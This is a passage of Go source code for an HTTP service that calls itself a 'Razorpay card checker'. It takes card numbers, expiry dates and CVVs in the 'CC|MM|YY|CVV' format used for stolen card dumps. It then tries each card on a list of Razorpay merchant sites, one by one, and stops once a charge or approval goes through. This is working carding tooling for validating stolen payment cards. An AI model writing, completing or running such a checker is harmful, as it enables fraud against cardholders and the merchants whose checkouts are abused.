	return nil, errors.New("invalid card format (use: CC|MM|YY|CVV)")
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}

func isDigitsMM(s string) bool {
	return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
	return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
	return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

func apiHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	path := r.URL.Path
	re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
	match := re.FindStringSubmatch(path)

	if len(match) < 2 {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"message":  "Invalid endpoint. Use: /razorpay/cc=CC|MM|YY|CVV",
			"example":  "/razorpay/cc=4403932663926839|08|26|249",
		})
		return
	}

	cardData, _ := url.QueryUnescape(match[1])
	card, err := parseCard(cardData)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status":  "error",
			"message": err.Error(),
		})
		return
	}

	// Try all sites one by one
	var result CheckResult
	for _, site := range razorpayURLs {
		log.Printf("Trying site: %s with card: %s", site, maskCard(card.CC))
		result = checkCardOnSite(card.CC, card.MM, card.YY, card.CVV, site)

		// Agar approved/charged mil gaya toh break
		if result.Status == "approved" || result.Status == "charged" {
			break
		}
		// Thoda delay before next site
		time.Sleep(1 * time.Second)
	}

	response := map[string]interface{}{
		"status":      result.Status,
		"message":     result.Message,
		"site_used":   result.SiteUsed,
		"card_masked": maskCard(card.CC),
		"bin":         card.CC[:6],
	}

	if result.Status == "error" {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}
	json.NewEncoder(w).Encode(response)

	// Log to console
	log.Printf("[%s] %s | Site: %s | Msg: %s",
		strings.ToUpper(result.Status), maskCard(card.CC), result.SiteUsed, result.Message)
}

// ============================================================
// MAIN
// ============================================================

func main() {
	log.SetFlags(log.Ldate | log.Ltime)

	http.HandleFunc("/razorpay/cc=", apiHandler)

	// Health check endpoint
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status": "ok",
			"sites":  len(razorpayURLs),
			"port":   PORT,
		})
	})

	addr := fmt.Sprintf("0.0.0.0:%d", PORT)
	log.Printf("=========================================================")
	log.Printf("  API RAZORPAY CARD CHECKER - GO VERSION")
	log.Printf("  Listening on: http://%s", addr)
	log.Printf("  API Endpoint: /razorpay/cc=CC|MM|YY|CVV")
	log.Printf("  Example: /razorpay/cc=4403932663926839|08|26|249")
	log.Printf("  Total Sites: %d", len(razorpayURLs))
	log.Printf("=========================================================")

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
